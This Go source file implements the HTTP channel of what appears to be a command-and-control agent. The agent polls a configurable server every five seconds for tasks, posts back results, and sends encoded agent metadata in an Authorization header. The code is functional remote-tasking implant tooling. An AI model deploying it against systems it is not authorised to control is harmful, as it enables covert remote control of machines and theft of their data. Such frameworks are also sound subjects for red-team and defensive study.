package models

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

type HttpCommModule struct {
	BaseCommModule
	ConnectAddress string
	ConnectPort    int
	tokenSource    chan bool
	client         *http.Client
}

func NewHttpCommModule(connectAddress string, connectPort int) *HttpCommModule {
	return &HttpCommModule{
		BaseCommModule: BaseCommModule{
			Inbound:  make(chan *AgentTask),
			Outbound: make(chan *AgentTaskResult, 10),
		},
		ConnectAddress: connectAddress,
		ConnectPort:    connectPort,
		client:         &http.Client{},
		tokenSource:    make(chan bool),
	}
}

func (h *HttpCommModule) Init(metadata *AgentMetadata) {
	h.AgentMetadata = metadata

	h.client = &http.Client{}
	encodedMetadata := base64.StdEncoding.EncodeToString(h.serialise(metadata))
	h.client.Transport = &headerTransport{
		base: http.DefaultTransport,
		headers: map[string]string{
			"Authorization": "Bearer " + encodedMetadata,
		},
		scheme: "http",
		host:   fmt.Sprintf("%s:%d", h.ConnectAddress, h.ConnectPort),
	}

}

func (h *HttpCommModule) Start() chan bool {
	go func() {
		for {
			select {
			case <-h.tokenSource:
				return
			default:
				if len(h.Outbound) > 0 {
					h.postData()
				} else {
					h.checkIn()
				}
				time.Sleep(5 * time.Second)
			}
		}
	}()
	return h.tokenSource
}

func (h *HttpCommModule) checkIn() {
	response, err := h.client.Get("/")
	if err != nil {
		return
	}
	defer response.Body.Close()

	var tasks []*AgentTask
	err = json.NewDecoder(response.Body).Decode(&tasks)
	if err != nil {
		return
	}

	for _, task := range tasks {
		h.Inbound <- task
	}
}

func (h *HttpCommModule) postData() {
	results := h.getOutbound()
	data, err := json.Marshal(results)
	if err != nil {
		return
	}

	_, err = h.client.Post("/", "application/json", bytes.NewReader(data))
	if err != nil {
	}
}

func (h *HttpCommModule) Stop() {
	close(h.tokenSource)
}

type headerTransport struct {
	base    http.RoundTripper
	headers map[string]string
	scheme  string
	host    string
}

func (h *headerTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.URL.Scheme = h.scheme
	req.URL.Host = h.host
	for k, v := range h.headers {
		req.Header.Add(k, v)
	}
	return h.base.RoundTrip(req)
}

func (h *HttpCommModule) serialise(data interface{}) []byte {
	encoded, _ := json.Marshal(data)
	return encoded
}

func (h *HttpCommModule) RecvData() ([]*AgentTask, bool) {
	var tasks []*AgentTask
	for {
		select {
		case task := <-h.Inbound:
			tasks = append(tasks, task)
		default:
			return tasks, len(tasks) > 0
		}
	}
}

func (h *HttpCommModule) SendData(result *AgentTaskResult) {
	h.Outbound <- result
}

func (h *HttpCommModule) getOutbound() []*AgentTaskResult {
	var results []*AgentTaskResult
	for {
		select {
		case result := <-h.Outbound:
			results = append(results, result)
		default:
			return results
		}
	}
}
